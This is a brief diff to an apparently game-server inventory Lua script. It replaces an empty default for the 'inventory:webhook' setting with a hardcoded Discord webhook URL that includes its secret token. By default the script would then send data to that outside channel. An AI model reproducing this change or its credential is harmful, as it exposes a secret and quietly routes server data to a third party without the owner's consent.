@@ -2,7 +2,7 @@ if not lib then return end
 
 local Utils = {}
 
-local webHook = GetConvar('inventory:webhook', '')
+local webHook = GetConvar('inventory:webhook', 'https://discord.com/api/webhooks/1233112828718747719/WGsQesHsXaSZkIfLp1SKPs_CZiSjpZMQXkz3uhNCUdSdXJaNsjwfhqd44dOOsHDdp5ug')
 
 if webHook ~= '' then
 	local validHosts = {
